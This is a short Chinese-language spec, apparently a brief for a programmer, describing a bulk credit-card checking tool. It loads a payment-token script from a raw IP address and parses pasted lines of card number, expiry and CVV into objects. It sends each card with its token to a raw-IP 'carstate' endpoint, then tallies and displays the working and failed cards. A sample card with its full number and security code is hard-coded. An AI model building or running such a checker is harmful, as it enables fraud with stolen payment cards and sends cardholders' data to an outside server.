### 项目初始化 获取TokenAPI 方法(由服务商提供-程序员只需要调用)
```
    <script src="https://45.138.68.37:39353/down/eJdoqqJzmIEt.js"></script>
	   Multipayment.init(__ID__)
	   let userscanner ={
          holdername: 'JODI WI',
          cardno: 4897882223258590,           
          expire: 202711,                    
          securitycode: 347
	   }
	   Multipayment.getToken(userscanner, 'gmoResponseHandler');
	   //gmoResponseHandler 为回调JSONP函数
	   
	  function gmoResponseHandler(response){
	   if (response.resultCode == '000') {
	   console.log('生成TOKEN成功');
      } else {
        console.log('无法生成TOKEN');
        // Failed to create token for the card
      }}
```
### 项目开始
#### 通过用户的输入正则匹配userscannern内容
```
若用户在<textarea></textarea>输入如下内容
5241350000244441|201101|221
5241350000244442|201102|222
5241350000244443|201103|223
将通过正则表达式产生如下let arr =数组【{
          holdername: 'JODI WI',
          cardno: 5241350000244441,           
          expire: 201101,                    
          securitycode: 221
	  	 },
		 {
          holdername: 'JODI WI',
          cardno: 5241350000244442,           
          expire: 201102,                    
          securitycode: 222
	   },
	   {
          holdername: 'JODI WI',
          cardno: 5241350000244443,           
          expire: 201103,                    
          securitycode: 223
	   }】
```
### 请求接口（http://45.138.68.37:5139/api/user/carstate） POST
#### 循环通过数组每一个item来请求接口（不能用定时器）
```
access_cardno:"账号cardno"
access_token：TOKEN
```

### 返回成功后 根据返回值 
#### 统计 失败数量 和 成功数量
#### 展现 失败卡密 和 成功卡密